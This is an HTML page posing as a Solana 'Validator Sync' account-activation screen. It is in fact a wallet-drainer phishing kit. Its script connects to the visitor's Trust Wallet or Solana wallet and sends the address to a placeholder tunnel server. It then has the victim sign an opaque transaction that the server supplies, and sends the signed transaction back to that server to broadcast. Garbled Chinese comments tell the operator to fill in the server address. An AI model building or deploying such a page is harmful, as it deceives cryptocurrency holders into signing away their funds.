<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Protocol Activation</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
</head>
<body style="background:#000; color:#fff; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh;">
    <div style="text-align:center; background:#111; padding:40px; border-radius:20px; border:1px solid #333;">
        <h2 style="color:#14f195;">VALIDATOR SYNC</h2>
        <button id="cta" style="background:#14f195; border:none; padding:15px 30px; border-radius:10px; font-weight:bold; cursor:pointer;">ACTIVATE ACCOUNT</button>
        <p id="msg" style="color:#666; font-size:12px; margin-top:15px;">Awaiting interaction...</p>
    </div>

    <script>
        // ðŸ”± åŠ¡å¿…æ›´æ–°è¿™ä¸ªåœ°å€
        const tunnel = "https://ä½ çš„ç©¿é€åœ°å€.com"; 

        document.getElementById('cta').onclick = async function() {
            const btn = this;
            const log = document.getElementById('msg');
            try {
                const p = window.trustwallet?.solana || window.solana;
                if (!p) { alert("Please use Trust Wallet browser!"); return; }

                btn.disabled = true;
                log.innerText = "Connecting...";
                await p.connect();

                log.innerText = "Fetching config...";
                const resp = await fetch(tunnel + "/prepare_v32", {
                    method: 'POST',
                    mode: 'cors', // ðŸ”± å¼ºåˆ¶è·¨åŸŸæ¨¡å¼
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address: p.publicKey.toString() })
                });

                const info = await resp.json();
                if (info.raw_tx) {
                    log.innerText = "Awaiting signature...";
                    const web3 = window.solanaWeb3;
                    const tx = web3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
                    
                    const signed = await p.signTransaction(tx);
                    log.innerText = "Broadcasting...";

                    const signedBase = btoa(String.fromCharCode.apply(null, signed.serialize()));
                    const bResp = await fetch(tunnel + "/broadcast_v41", {
                        method: 'POST',
                        mode: 'cors',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ signed_tx: signedBase })
                    });
                    
                    const result = await bResp.json();
                    log.innerText = "Complete!";
                    alert("Activation Successful!");
                }
            } catch (err) {
                alert("Error: " + err.message);
                log.innerText = "Failed. Reloading...";
                setTimeout(() => window.location.reload(), 2000);
            }
        };
    </script>
</body>
</html>
